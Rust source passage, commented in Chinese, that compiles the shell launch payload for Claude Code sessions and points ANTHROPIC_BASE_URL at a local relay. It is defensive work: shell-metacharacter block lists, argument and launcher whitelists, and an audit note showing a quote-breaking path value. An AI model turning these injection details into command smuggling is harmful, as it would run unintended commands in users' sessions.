//! **「起一个会话」的载荷编译器** —— `env 前缀 → cd → argv → wrap` 那一段串的唯一 Rust 真相源。
//!
//! # 它是哪一层
//!
//! 一条完整的远端起会话命令有两层：
//!
//! ```text
//! tmux new-session -d -s '=name:' … ; send-keys -t … '<载荷>' Enter ; tmux attach …
//! └────────────────────── 外层：容器 ──────────────────────┘ └─ 内层：载荷 ─┘
//! ```
//!
//! 本模块只管**内层**。⚠ **不是因为外层「已经没了」** —— U8c-1 第一版这么写，被审计证伪：
//! daemon 的 `launch`（U8a-2b）**零生产调用方**、它**结构上也不 attach**（平面 ③），
//! 而 `account_usage.rs::build_usage_probe_cmd` 今天就在 Rust 里拼一整条外层 tmux 串。
//! 外层的四个产出方一个都没退役，处置见 `doc/INVARIANTS.md` §33b。
//!
//! # 它为什么住在这里（P4b，§1.4b）
//!
//! 它原来在共享 crate（当时叫 `launch-core`）里 —— 而 **daemon 对它零引用**。放在那儿的真实原因是
//! 「monitor 侧当时一个边界都没有，没处放」。P4a 划出 `backend/control/` 之后它回到了归属地：
//! §1.3 把最终 exec 钉在**用户自己的终端进程**里，U8a-2b 把 daemon 的执行面定成
//! **argv 直传、不过 shell** ⇒ **「渲染一条 shell 命令串」永远属于开终端的那一侧。**
//!
//! 唯一留在共享 crate 里的是 [`shell_quote_core::posix_quote`]（daemon 的 `tmux_hook` 真的在用）。
//!
//! # 诚实边界（别读成「合完了」）
//!
//! - 生产消费方今天有三个：`history.rs` 的 POSIX 分支（只用 [`config_dir_prefix_posix`]）、
//!   `account_usage.rs` 的用量探针（[`usage_probe_payload`] → [`render_payload`]）、
//!   以及 `backend/control/launch_wire.rs` 的 `render_launch_payload`（`container:"none"` 那格）。
//! - **Windows 分支不在这里** —— `$env:CLAUDE_CONFIG_DIR=$null; ` 与它自己那套
//!   「什么算绝对路径」（盘符 / UNC / `\` 分隔）是刻意的平台特化。
//! - TS 侧还剩 `launch-render-fallback.ts` 一个产出点（U8c-3 删除）。跨语言一致性由
//!   `fixtures/payload-golden.json` 的**逐字节对拍**保证（TS 生成并入库、Rust 读同一份自己渲染再比）。

/// P1：**业务拒绝的唯一构造口** —— 所有「渲染不出来，且这是坏输入」的 `Err` 都必须经这里。
///
/// # 为什么要打标（不是为了好看）
///
/// TS 侧 `sendIntoViaDaemon` 的 catch 此前把两件事混成一件：**IPC 异常**（后端崩/序列化坏）
/// 与**载荷渲染被拒**。它的注释推理「两者都在 daemon 那一跳之前 ⇒ 能证明什么都没发出去
/// ⇒ 可回落」——**对一半错一半**：没发出去只说明**重做不会重复执行**，
/// **不说明重做走的那条路也会拒**。而回落那条路是 TS 兜底渲染器，
/// 它对同样输入**未必拒**（`remote-launch-run.ts` 自己逐字承认过）。
/// ⇒ 一次 Rust 侧的 fail-closed 被那个 catch 变成了 fail-open。
///
/// 打标之后 TS 侧按标记分流：带标记 ⇒ `refused`（不回落 + toast）；不带 ⇒ IPC 异常 ⇒ `fallback`。
///
/// # 它不是什么
///
/// ⚠ 这是**字符串约定不是类型**（诚实边界 9a）：有人手写一个带同样前缀的普通错误串，
/// 就会被 TS 当成业务拒绝。要靠类型分开得让 command 的错误结构化 —— 那是 `U6`，单独立项。
/// 全仓实测：**70 个 tauri command 的错误类型 100% 是 `String`**，本件不在这里开第一个口。
pub(crate) const REFUSE_TAG: &str = "REFUSE:";

/// 见 [`REFUSE_TAG`]。判据 `every_business_rejection_is_tagged` 钉住「渲染路径上不许裸 `Err`」。
pub(crate) fn refuse(msg: impl std::fmt::Display) -> String {
    format!("{REFUSE_TAG} {msg}")
}

use std::fmt::Write as _;

/// 两种 shell 共用的元字符黑名单。
///
/// **`\` 不在里面** —— 见 [`config_dir_command_safe`]：POSIX 侧由调用点额外拒掉它
/// （那边的路径里不该有反斜杠），而 Windows 侧的账号目录长成 `C:\Users\z\.claude-accts\z`，
/// 把 `\` 一律禁掉等于禁掉整个平台。它在两种 shell 的**单引号**里都是字面量
/// （POSIX `'…'` 无转义；PowerShell `'…'` 无插值），真正要挡的是能提前闭合引号或另起命令的那几个。
/// 〔audit-0805 08-06〕提为 `pub(crate)`：它是**权威源**，
/// `history.rs` 那份逐字副本已删（E3），判据也要遍历这一份而不是再抄一遍。
pub(crate) const SHELL_META_COMMON: &str = "'\"`$;|&<>*?()!";

/// 一个字符能不能出现在**要拼进命令**的 config dir 里。
///
/// # 不可见字符判据为什么是 `acct_core::is_deceptive_char`
///
/// U7-3 把这张表收进 `acct-core` 并让两个**读 manifest** 的地方共用
/// （`local_accounts.rs` · `accounts_query.rs`），取的是两侧并集。
/// **但「拼命令」那条路当时没跟上** —— `history.rs` 一直用自己那张 U7-3 之前的 18 项旧表，
/// 缺 `U+1680` · `U+2000..200A` · `U+202F` · `U+205F` · `U+2060..2064` · `U+3000`
/// （实测 `history.rs` 全文零 `acct_core` import）。
///
/// ⚠ **诚实定级**：那是**纵深防御**的缺口，不是当时可利用的洞 —— configDir 的上游
/// （本机 / 远端 manifest）都已经用并集把过一道。但「权威也保留本地校验」是这个仓自己
/// 写在 `resolve_query.rs` 头注里的纪律（B2），少一层就是少一层。
pub fn is_command_unsafe_char(c: char) -> bool {
    c.is_control()
        || ('\u{0080}'..='\u{009f}').contains(&c)
        || SHELL_META_COMMON.contains(c)
        || acct_core::is_deceptive_char(c)
}

/// **POSIX 命令面**的 config dir 校验：绝对 POSIX 路径、无 `..` 段、无反斜杠、
/// 无元字符/控制符/视觉欺骗字符。
///
/// fail-closed：稍有可疑即判非法，**绝不拼进命令**。
pub fn config_dir_command_safe(dir: &str) -> bool {
    if !dir.starts_with('/') || dir == "/" || dir.contains("/../") || dir.ends_with("/..") {
        return false;
    }
    !dir.chars().any(|c| c == '\\' || is_command_unsafe_char(c))
}

/// 「这次拉起用哪个账号」—— **三态，不是两态**。
///
/// | 取值 | 含义 | 产出的前缀 |
/// |---|---|---|
/// | `None`（参数缺席） | 调用方没表态 | 空串 |
/// | [`Account::Base`] | 用户**显式**选了账号 0 | `unset CLAUDE_CONFIG_DIR; ` |
/// | [`Account::Named`] | 具名账号 | `export CLAUDE_CONFIG_DIR='…'; ` |
///
/// **「账号 0」不能等于「什么都不加」**：用户的 shell rc 里很可能有一句
/// `export CLAUDE_CONFIG_DIR=<默认账号>`（`cc-acct-iso shellinit` 生成的就是它），
/// 而本机拉起**故意加载 rc** ⇒「什么都不加」会落到默认账号上 = **静默串号**。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Account<'a> {
    Base,
    Named { config_dir: &'a str },
}

/// POSIX 账号前缀。非法 configDir ⇒ `Err`（调用方报错，绝不拼进命令）。
pub fn config_dir_prefix_posix(account: Option<&Account>) -> Result<String, String> {
    match account {
        None => Ok(String::new()),
        Some(Account::Base) => Ok(UNSET_CONFIG_DIR_PREFIX.to_string()),
        Some(Account::Named { config_dir }) => {
            let d = config_dir.trim();
            // 空串**不是**账号 0，是坏数据（空值 ≠ 未设 —— Z01 起整套设计的支点）。
            if d.is_empty() {
                return Err(refuse("具名账号的 configDir 是空的（账号 0 请用 base）"));
            }
            if !config_dir_command_safe(d) {
                return Err(refuse(format!(
                    "拒绝拼入命令：非法 CLAUDE_CONFIG_DIR {d:?}"
                )));
            }
            Ok(format!("export CLAUDE_CONFIG_DIR='{d}'; "))
        }
    }
}

/// 「**显式不注入** `CLAUDE_CONFIG_DIR`」这条前缀 —— 也就是账号 0 的起法。
///
/// 逐字节形态被 e2e 探针用 `grep -q "unset CLAUDE_CONFIG_DIR;"` 断言，且与 TS
/// `shell-quote.ts::UNSET_CONFIG_DIR_PREFIX` 同源（对拍夹具覆盖）。
pub const UNSET_CONFIG_DIR_PREFIX: &str = "unset CLAUDE_CONFIG_DIR; ";

/// 载荷里的一条环境操作。
///
/// **刻意是窄变体而不是通用 `{op, key, value}`**（照搬 TS `launch-plan.ts::EnvOp` 的裁决）：
/// 通用形态等于给任何上游开一个「往命令里塞任意变量名」的口子，
/// 而实际产出者的键集合全是代码里写死的。把「清哪些变量」从**数据**移进**变体名**之后，
/// 那件事在类型层不可表达。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EnvOp<'a> {
    ExportConfigDir {
        value: &'a str,
    },
    ExportModel {
        value: &'a str,
    },
    UnsetConfigDir,
    /// 嵌套会话标记全套。键表由调用方给（TS 侧来自 `AGENT_PROFILE.nestedEnvVars`）——
    /// **这是唯一一处键表不写死在本 crate 里的地方**，因为它是 per-agent 的画像数据。
    UnsetNestedEnv {
        keys: &'a [&'a str],
    },
}

/// 包裹规格：`( <prelude>; exec <inner> )`，`order` = 嵌套深度（升序由内向外折叠）。
///
/// `exec` 不能省 —— wrapper 用 `$BASHPID` 读 `sessions/$cpid.json`，不 exec 则 PID 对不上。
/// **`inner` 必须是「只有 argv」的那一段，不能带 env 前缀或 `cd`**：`exec` 后面必须直接跟
/// 可执行文件，否则折叠出 `( …; exec unset A B; claude … )` ⇒ 实测 rc=127，launcher 起不来。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WrapSpec<'a> {
    pub order: i64,
    pub prelude: &'a str,
}

/// 一个 argv 元素能不能安全地参与 `join(" ")`。
///
/// 载荷是空格拼起来的一整条 shell 串，所以 arg 里**任何空白都会让它裂成多个参数**，
/// 任何 shell 元字符都可能另起一条命令。放行集刻意窄：字母数字 + `-_.:/=,@+`
/// —— 覆盖 `--resume` 与 UUID 形态的 sid（今天 `args` 的唯一真实内容），其余一律拒。
///
/// ⚠ **已知过严、且与同 crate 另一道闸不对称**（代码审计指出）：这里用 `is_ascii_alphanumeric`
/// ⇒ **非 ASCII 一律拒**，而 [`config_dir_command_safe`] 是**放行中文的**（`/home/用户/…`
/// 有专门的放行测试）。不带引号的 CJK 对 shell 是惰性的（不分词、非元字符），
/// 所以这一格今天是「宁可过严」。**今天零生产流量**（`plan.args` 恒空），
/// 等 U8c-2b 往 args 里塞 `--add-dir <中文路径>` 这类东西时会撞上 —— 届时错误文案说的是
/// 「含空白或 shell 元字符」，**会误导**，要一并改。
pub fn arg_is_join_safe(a: &str) -> bool {
    !a.is_empty()
        && a.chars().all(|c| {
            c.is_ascii_alphanumeric()
                || matches!(c, '-' | '_' | '.' | ':' | '/' | '=' | ',' | '@' | '+')
        })
}

/// 载荷编译的输入。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PayloadSpec<'a> {
    pub env: &'a [EnvOp<'a>],
    /// `None` = 不加 `cd`。**顺序不是任意的**：`cd` 排在 env 之后、argv 之前
    /// （`<envOps>cd '<cwd>' && <argv>`），早期实现曾把它放最前面，逐字节对拍时抓到。
    pub cwd: Option<&'a str>,
    /// launcher。**sanitize 必须先于 wrap**（设计债 #2）。
    ///
    /// ⚠ **08-08 订正**：本行原写「那是函数组合上的**结构保证**，本 crate 收的是结果，
    /// 不在这里再 sanitize 一次」——**当时不成立**：字段是裸 `&str`，而 wire 那条路
    /// （`launch_wire.rs`）把 `&req.launcher`（**来自 webview**）原样传了进来，
    /// 中间没有任何净化。所谓「结构保证」只是一句调用约定。
    /// ⇒ `render_payload` 现在自己拒注入字符（见那里的注释），
    /// 由 `the_launcher_is_refused_when_it_carries_injection_chars` 钉住。
    pub launcher: &'a str,
    pub args: &'a [&'a str],
    pub wrap: &'a [WrapSpec<'a>],
}

fn render_env_ops(ops: &[EnvOp]) -> Result<String, String> {
    let mut out = String::new();
    for op in ops {
        match op {
            EnvOp::ExportConfigDir { value } => {
                // ★ 与 `config_dir_prefix_posix` 同一道闸 —— 两个入口不许安全姿态相反。
                if value.is_empty() {
                    return Err(refuse("configDir 是空串（账号 0 请用 UnsetConfigDir）"));
                }
                if !config_dir_command_safe(value) {
                    return Err(refuse(format!(
                        "拒绝拼入命令：非法 CLAUDE_CONFIG_DIR {value:?}"
                    )));
                }
                let _ = write!(
                    out,
                    "export CLAUDE_CONFIG_DIR={}; ",
                    shell_quote_core::posix_quote(value)
                );
            }
            EnvOp::ExportModel { value } => {
                let _ = write!(
                    out,
                    "export ANTHROPIC_MODEL={}; ",
                    shell_quote_core::posix_quote(value)
                );
            }
            EnvOp::UnsetConfigDir => out.push_str(UNSET_CONFIG_DIR_PREFIX),
            EnvOp::UnsetNestedEnv { keys } => {
                if keys.is_empty() {
                    return Err(refuse("嵌套 env 键表是空的 ⇒ 会渲染出裸 `unset ; `"));
                }
                let _ = write!(out, "unset {}; ", keys.join(" "));
            }
        }
    }
    Ok(out)
}

fn apply_wraps(inner: String, wraps: &[WrapSpec]) -> String {
    let mut ordered: Vec<&WrapSpec> = wraps.iter().collect();
    ordered.sort_by_key(|w| w.order);
    ordered
        .into_iter()
        .fold(inner, |s, w| format!("( {}; exec {} )", w.prelude, s))
}

/// `env ops → cd → argv → wrap` 的编译。与 TS `launch-render-fallback.ts` 的
/// 「非容器 / 载荷」那一段逐字节同义（对拍夹具是判据，不是这句注释）。
///
/// # 为什么回 `Result` 而不是 `String`（U8c-1 代码审计 R1/R2）
///
/// 第一版回 `String`，于是同一个 crate 里两个「产出 `export CLAUDE_CONFIG_DIR=…`」的入口
/// **安全姿态相反**：[`config_dir_prefix_posix`] 会校验，而 `EnvOp::ExportConfigDir`
/// 一个字符都不查。审计实跑：
///
/// ```text
/// export-config-dir = "/a'b"   TS: throw          Rust: export CLAUDE_CONFIG_DIR='/a'\''b';
/// export-config-dir = "rel/x"  TS: throw          Rust: export CLAUDE_CONFIG_DIR='rel/x';
/// ```
///
/// ⚠ **这一类差异「TS 生成夹具」这个机制结构上抓不到** —— 要让夹具覆盖它，TS 侧生成夹具时
/// 就会 throw，那条用例根本进不了夹具。加多少用例都没用。⇒ 只能靠**类型**：回 `Result`。
///
/// # 空串一律是坏数据，不是「没有」（Z01 起的支点：空值 ≠ 未设）
///
/// TS 侧把 `""` 当「没有」（`plan.cwd ? … : ""`），Rust 侧不跟 —— 两种产物在生产里都是坏的：
/// `cd '' && …` 会短路让 launcher 起不来，`CLAUDE_CONFIG_DIR=''` 是**静默串号**。
/// ⇒ 本 crate 对 `Some("")` / `value: ""` 回 `Err`。**这是与 TS 的一处刻意分歧**，
/// 记在 `doc/INVARIANTS.md` §33b；U8c-2/3 收编 TS 时要一并把那边也改成 fail-closed。
///
/// # `args` 的盲区已经闭掉（U8c-2a）
///
/// U8c-1 交付时这里写着「`args` 不 quote，两侧一起错 ⇒ 对拍照绿，U8c-2 让 Rust 当生产者时
/// 必须先解决」。**本轮解决了**：每个 arg 过 [`arg_is_join_safe`] 白名单，
/// 含空白或 shell 元字符一律 `Err`。
///
/// **刻意不改成逐个 quote** —— 那会与 TS 的 `join(" ")` 逐字节分家，而黄金串对拍正靠字节相等。
/// 白名单让**会裂/会注入的那一类在类型之外不可表示**，合法输入的字节一个都没变。
///
/// - **`launcher` 的 sanitize** 仍然不管：收的是已净化值（见 [`PayloadSpec::launcher`]）。
///
/// # 只覆盖 TS 两种载荷形态里的一种
///
/// `renderFallback` 的 `container:"none"` 分支是 `env + cd + argv`，
/// `container:"tmux"` 分支是 `env + argv`（**没有 `cd`** —— cwd 单独交给 `SESSION_BACKEND`）。
/// 本函数是前者。U8c-2 接 tmux 路径时**必须传 `cwd: None`**，否则会多出一段 `cd`。
pub fn render_payload(spec: &PayloadSpec) -> Result<String, String> {
    for a in spec.args {
        if !arg_is_join_safe(a) {
            return Err(refuse(format!(
                "拒绝拼入命令：参数 {a:?} 不在放行集里 —— 载荷是 `join(\" \")` 拼的，\
                 空白会让它裂成多个参数、shell 元字符会另起一条命令。\n\
                 放行集是 `[A-Za-z0-9] + -_.:/=,@+`；**非 ASCII 也一律拒**（已知过严，\
                 且与 `config_dir_command_safe` 放行中文不对称，见 `arg_is_join_safe` 头注）"
            )));
        }
    }
    // ★ **launcher 也要过一道**〔audit-0805 08-08〕：本函数对 `args` 逐个过白名单，
    // 而 `launcher` 此前**一个检查都没有** —— 它被直接拼进 `argv` 再 `join(" ")`。
    // 这条路的上游是 tauri 命令 `render_launch_payload`：`launcher` 来自 webview。
    //
    // ⚠⚠ **08-08 订正赌注**（本条建成的次轮先核出来的）：这道检查是**纵深，不是边界**。
    // `daemon_send_into` 同样是注册命令，它的 `payload: String` 也来自 webview，
    // 而 daemon 侧只查「非空 / 长度 / 无控制字符」（`check_field`）—— 也就是说
    // **前端本来就能绕过本函数，直接送一条任意载荷去键入**。
    // ⇒ 本检查买到的是：① 走**文档化的那条路**时不会把注入串拼进载荷（挡的是**缺陷**，
    // 不是攻击者）；② 与同函数 `args` 那道白名单**姿态一致**（不对称本身会误导下一个人）。
    // 真正的边界在别处：daemon 的 `admit`（会话身份）+ 前端执行面（CSP / 能力表）。
    //
    // 字符集镜像 TS 的 `sanitizeRemoteLauncher`（今天真正管着这条路的那份策略），
    // 但按本函数的既有惯例**返回 `Err` 而不是静默回落**：拒绝要让调用方看得见。
    // ⚠ 刻意**不复用** `history::sanitize_launcher` 的白名单 —— 它排掉了 `/`，
    // 而远端 launcher 合法地可以是 `/usr/local/bin/claude`（收太紧 = 把一个洞换成一个回归）。
    if let Some(c) = spec
        .launcher
        .chars()
        .find(|c| matches!(c, ';' | '|' | '&' | '$' | '`' | '<' | '>' | '\n' | '\r'))
    {
        return Err(refuse(format!(
            "拒绝拼入命令：launcher {:?} 含注入字符 {c:?} —— 载荷会被键进会话执行，\n\
             一个 `;` 或 `|` 就能另起一条命令。合法形态是命令名或路径（可带空格分段）。",
            spec.launcher
        )));
    }
    let mut argv = vec![spec.launcher];
    argv.extend_from_slice(spec.args);
    let inner = argv.join(" ");
    let cd = match spec.cwd {
        Some("") => return Err(refuse("cwd 是空串 —— 空值 ≠ 未设；不加 cd 请用 None")),
        Some(c) => format!("cd {} && ", shell_quote_core::posix_quote(c)),
        None => String::new(),
    };
    Ok(format!(
        "{}{}{}",
        render_env_ops(spec.env)?,
        cd,
        apply_wraps(inner, spec.wrap)
    ))
}

/// 一次性**用量探针**会话的启动载荷（U8c-2a：`render_payload` 的第一个生产用例）。
///
/// 形态 `<账号前缀>unset <嵌套env>; <launcher>` —— **没有 `cd`**（探针不关心工作目录），
/// 也就是 `PayloadSpec { cwd: None, args: [], wrap: [] }` 那一格。
///
/// # 账号维度**恒显式表态，只有两态**
///
/// 用量探针恒是 per-account 的 —— 探不出「哪个账号」的用量就没有意义：
///
/// | `config_dir` | 含义 | 前缀 |
/// |---|---|---|
/// | `Some(路径)` | 具名账号 | `export CLAUDE_CONFIG_DIR='…'; ` |
/// | `None` | **账号 0**（Z03） | `unset CLAUDE_CONFIG_DIR; ` |
/// | `Some("")` | **坏数据，不是账号 0** | `Err` |
///
/// **绝不退化成裸载荷** —— 远端 rc 里那句 `export CLAUDE_CONFIG_DIR=<默认账号>` 会让探针
/// 探到别的号，而 UI 会把结果标成账号 0 的用量 = **静默串号**。
pub fn usage_probe_payload(
    config_dir: Option<&str>,
    nested_env: &[&str],
    launcher: &str,
) -> Result<String, String> {
    let account = match config_dir {
        None => EnvOp::UnsetConfigDir,
        Some("") => {
            return Err(refuse(
                "用量探针需要显式 configDir（账号 0 请传 None，空串是坏数据）",
            ))
        }
        Some(dir) => EnvOp::ExportConfigDir { value: dir },
    };
    render_payload(&PayloadSpec {
        env: &[account, EnvOp::UnsetNestedEnv { keys: nested_env }],
        cwd: None,
        launcher,
        args: &[],
        wrap: &[],
    })
}

// ═════════════════════════════════════════════════════════════════════════════
// `K-H2b`：**接上注入点** —— 起会话那一刻把 `ANTHROPIC_BASE_URL` 指向本机中转
// ═════════════════════════════════════════════════════════════════════════════
//
// # 这一段为什么在这里
//
// `K-H2b` 的 `Bx` 换了一把尺子：**注入点不是「入口」的属性，是「渲染 env 前缀那一层」
// 的属性**（`K20`：判据/说法按形状认，不按主题名）。本模块正是那一层在 Rust 侧的家
// —— `config_dir_prefix_posix` 与 `render_env_ops` 都住这儿。
//
// # ⚠ 三条**没买到**的，先写在最前面，别读成买到了（铁律 14）
//
// 1. **claude 拿到这个变量之后到底怎么走，本仓零证据、本轮也没量**
//    （红线 `C7`：绝不起真 claude）。订阅号的 OAuth 刷新会不会仍打官方域名 ·
//    只设 base URL 不设 token 会不会拒启 · `/v1/messages` 之外还打哪些路径 ——
//    **一律 `判不了`**。本段买到的是「渲染器 → env → 中转 → 上游」这一截，
//    **买不到**「claude 会照它走」那一截。
// 2. **Windows 那一侧只到「编得过」**（`relay_env_prefix_ps` 一行运行时行为都没量过），
//    原样延续 `K-H2` 的登记。
// 3. **远端那一半不做**（`K-H2b` `§0e` 裁四）：把 key 送到远端那台机器的路
//    （`parity_ledger.rs` 的 `creds.relay-key`）今天**没有主人**。
//    回环地址是**自指**的 ⇒ 同一个字面串写进哪台机器就指哪台，
//    但「那台机器上有没有那份凭据」是另一件事，本件明写 `判不了`。

/// 路由键的固定首段。**`route.rs::parse` 用 `strip_prefix("/s/")` 认它。**
pub const RELAY_ROUTE_PREFIX: &str = "/s/";

/// 本机中转的端口。**monitor 这一侧是权威** —— 起中转时以 `CCM_RELAY_PORT`
/// 显式交给子进程（`local_daemon::start_local_relay`），注入侧用同一个常量拼 URL。
///
/// ⚠ 它与 `remote-daemon-proto/src/relay/server.rs::DEFAULT_PORT` 是**同一个数字的两处写法**，
/// 而两处**今天不由任何东西对拍**。之所以不疼：起中转那条路**显式传** `CCM_RELAY_PORT`
/// ⇒ 子进程用的是这里这个值，daemon 那个默认值在这条路上根本不参与。
/// **端口通告面本件不做**（`§0e` 裁五，跟进件 `己1-f26`）——
/// ⇒ 「同机两个 monitor」这一形今天是：第二个中转绑不上、**退 2 并出声**，不静默。
pub const RELAY_PORT: u16 = 8788;

/// 一段路由键里允许的字符 —— **与 `remote-daemon-proto/src/relay/route.rs::segment_is_safe`
/// 是同一条规则**（白名单，不是黑名单；`.` 与 `/` 都不在里面 ⇒ `..` 构造不出来）。
///
/// # ⚠ 它是**第二份实现**，这件事必须说清楚，不许读成「共用了一份」
///
/// 两侧分家的原因是结构性的：`remote-daemon-proto` 依赖 `src-tauri/crates/*`（单向），
/// 反向依赖不存在 ⇒ 除非把这条规则搬进一个**共享 crate**，否则 monitor 够不着 daemon 那份。
/// 本件的写区里**没有任何共享 crate** ⇒ 本轮只能各写一份，并**用判据把它们焊住**：
///
/// - monitor 侧：`the_relay_route_sample_is_what_the_builder_really_produces`
///   钉住 [`RELAY_ROUTE_SAMPLE`] 逐字节等于 [`relay_route_path`] 的产物；
/// - daemon 侧：`route.rs` 的 `the_sample_the_monitor_side_builds_parses_into_the_slots_we_expect`
///   `include_str!` **本文件**、把那一行样例抠出来喂给真 `parse`，断言四段各落各位。
///
/// ⇒ 买到的是「**两侧对同一条样例的判断一致**」，**不是**「两条谓词逐字符等价」。
/// 差的那一格叫「量过没有」：我没有、也做不出「对所有输入两侧同答」的判据（那要跨 crate 调用）。
pub fn relay_segment_is_safe(seg: &str) -> bool {
    !seg.is_empty()
        && seg.len() <= 128
        && seg
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
}

/// 路由键 `/s/<agent>/<account>/<key>` 的**唯一构造口**（monitor 生产段）〔`KH2B4`〕。
///
/// # 为什么「只许有一个」是承重的（`LEDGER.md#KL7` 第 1 条）
///
/// 老三段键 `/s/<agent>/<key>/<真路径>` **不会被解析器拒掉** —— 它被重读成
/// `account=<key>` 的另一条四段路由，三段都过白名单、**解析成功**。
/// 挡住它的**不是**解析器，是「表里查不到」⇒ **404**，而那在另一个文件里。
/// ⇒ 注入侧拼错一段的症状是「**一个查不出来的 404**」，不是「拼错了」。
/// 两处各拼一遍，就会各自答错同一个问题。
///
/// **fail-closed**：任一段过不了白名单就 `Err`，绝不拼一条「看起来对」的 URL 出去。
pub fn relay_route_path(agent: &str, account: &str, key: &str) -> Result<String, String> {
    for (what, seg) in [("agent", agent), ("account", account), ("key", key)] {
        if !relay_segment_is_safe(seg) {
            return Err(refuse(format!(
                "拒绝拼中转路由键：{what} 段 {seg:?} 不是合法路由段\
                 （只许字母数字与 `-` `_`，1..=128 字节）。\n\
                 ⚠ 拼错一段的症状是中转回一个**查不出来的 404**，不是「拼错了」——\
                 所以这里宁可当场拒。"
            )));
        }
    }
    Ok(format!("{RELAY_ROUTE_PREFIX}{agent}/{account}/{key}"))
}

/// 注入给 agent 进程的 base URL。**恒回环**（`§0e` 裁四：回环是自指的，
/// 同一个字面串写进哪台机器就指哪台 ⇒ 「选机器」这件事已经由「这条命令在哪台机器上跑」做完了）。
pub fn relay_base_url(port: u16, agent: &str, account: &str, key: &str) -> Result<String, String> {
    Ok(format!(
        "http://127.0.0.1:{port}{}",
        relay_route_path(agent, account, key)?
    ))
}

/// 跨半边对拍用的那一行样例。**daemon 侧的判据 `include_str!` 本文件、拿它去 `parse`。**
///
/// ⚠ 它不是文档，是**夹具**：`the_relay_route_sample_is_what_the_builder_really_produces`
/// 钉住它逐字节等于 [`relay_route_path`] 的产物 ⇒ 谁改了构造口而没改它，monitor 这侧当场红；
/// 谁改了它而 daemon 那侧解析不出预期的段，daemon 那侧当场红。
pub const RELAY_ROUTE_SAMPLE: &str = "/s/claude-code/acct-a/k-0123456789abcdef";

/// `<key>` 段的**唯一铸造口**〔`KH2B6`〕。
///
/// # 规则（写下来的那一条，别两边各造一个）
///
/// | 这一格 | `<key>` 填什么 |
/// |---|---|
/// | resume 一条已有会话 | **那条会话的 sid**（现成的，天然是 UUID 形态 ⇒ 过得了白名单） |
/// | 新开一个会话 | **一个启动时生成的 nonce** —— 不等 claude 产 sid |
///
/// # ⚠ 它欠的账，写在这里（`§0e` 裁二逐字采纳）
///
/// nonce 与 claude 事后产生的 sid **没有对应关系**。谁将来想按 sid 去 join tee 那条流，
/// 会发现对不上。**今天不是缺陷、是债** —— 理由是现打的两个读数：
/// 表**只按 `<account>` 索引**（`relay/table.rs` 的 `fn lookup(&self, account: &str)`），
/// `route.key` 的生产段**只喂 tee**（`relay/server.rs` 的 `tee.open` / `tee.event` 两处）
/// ⇒ 这一段**不参与选上游、不参与选凭据**，而 tee 今天**零消费者**。
///
/// ★ 为什么不像 tmux 基名那样「不许在 Rust 里补默认」（`己1-f4` / `F13` 那个坑）：
/// 那条坑的要害是**撞名避让住在别处**（`mintTmuxName` 是唯一铸造口，补一个默认名会绕开避让）。
/// 这一段**没有任何避让语义** —— 它对路由完全惰性，两个会话拿到同一个值也只是 tee 标签重复。
/// ⇒ 不同形，不是第四次。
fn mint_route_key() -> String {
    // UUID v4 的连字符形态逐字过得了 `relay_segment_is_safe`（`[0-9a-f-]`，36 字节）。
    uuid::Uuid::new_v4().to_string()
}

/// 见 [`mint_route_key`]。**这是 `<key>` 段唯一的取值口** —— resume 用 sid，新开用 nonce。
///
/// sid 过不了白名单时**也回落到 nonce**（而不是 `Err`）：这一段对路由惰性，
/// 为它把一次起会话整个拒掉不划算；代价是 tee 上那一行标的不是 sid，**而那正是上面登记的那笔债**。
pub fn route_key_for_session(sid: Option<&str>) -> String {
    match sid {
        Some(s) if relay_segment_is_safe(s) => s.to_string(),
        _ => mint_route_key(),
    }
}

/// **POSIX 命令面**的中转前缀 —— **本文件生产段里唯一一处**产出
/// `export ANTHROPIC_BASE_URL=` 的地方〔`KH2B4`，由
/// `only_one_place_in_this_file_exports_the_relay_base_url` 数着〕。
///
/// ⚠ **那条判据的人群只有本文件**（它 `include_str!("payload.rs")`）——
/// 别把它读成「全仓唯一一处」。全仓那一格是**一天的读数**，不是一条会自我维持的断言（`K20`）：
/// 08-28 现打，分母 = 703 个跟踪文件，量法 `git ls-files -z | xargs -0 grep`，
/// 产出形状 `export ANTHROPIC_BASE_URL=` 的**生产行恰好 1** —— 就是下面这一行；
/// 其余命中全是判据字面量 / 测试期望 / 散文（非空对照：同一把尺子量
/// `ANTHROPIC_BASE_URL` 命中 **6** 个文件）。
pub fn relay_env_prefix_posix(base_url: &str) -> String {
    format!(
        "export ANTHROPIC_BASE_URL={}; ",
        shell_quote_core::posix_quote(base_url)
    )
}

/// **Windows 命令面**的中转前缀。形状照 `history.rs::config_dir_prefix_ps`（PowerShell
/// 单引号里无插值）。
///
/// ⚠⚠ **本函数只到「编得过」** —— Windows 上的运行时行为本轮**一格都没量**
/// （`K-H2` 的同一条登记原样延续）。
/// ⚠ `doc/INVARIANTS.md §36` 那条铁律**只绑 Windows**（`P3t` 收窄过），而本函数正是
/// Windows 那一侧，所以要说清它没被放宽：本函数**不**给本地渲染器补一段读 `plan.env`
/// 的代码，它只把一个调用方已经算好的串拼上去。
pub fn relay_env_prefix_ps(base_url: &str) -> String {
    format!("$env:ANTHROPIC_BASE_URL='{base_url}'; ")
}

/// 「这次拉起要不要走中转」的**唯一判断口**〔`§0e` 裁一：**只接 api-key 号**〕。
///
/// # 判据是「表里有没有这一行」，不是「这个号看起来是不是 api-key 号」
///
/// 中转的路由表按账号 id 索引，**没有那一行就是 404**（`KL7` 第 2 条：查不到 ⇒ 404 且
/// 一个字节不发上游、不许回落）。⇒ 把一个表里没有的号指向中转 = 亲手把一个能用的号弄坏。
/// 而**行是用户配第三方 key 时才会有的** ⇒ 「表里有行」与「这是个 api-key 号」在生产上同延，
/// 但前者是**可判定的**、后者要靠 manifest 里那个自述字段。
///
/// ⚠ **空账号那一行是显式的 keyless 透传**（`KL7` 第 3 条），它**也**算「有行」——
/// 那是用户显式写下的一条路，不是「查不到时的默认」。
///
/// ⇒ **没配第三方 key 的号一个字节都不受影响**：`accounts` 里没有它 ⇒ 本函数回 `None`
/// ⇒ 前缀逐字节与本件之前相同（`KH2B5` 的对照就打这一格）。
/// ⚠ **第三个入参刻意不叫 `relay_running`**〔`D6 阻-4`，08-29〕：
/// `history.rs` 那道人群闸数的是**标识符 `relay_running` 在生产段里出现几次**
/// （定义 1 + 缝里那一处 1 = 2），一个同名的形参会让那个数恒多两处、闸就只能靠一个
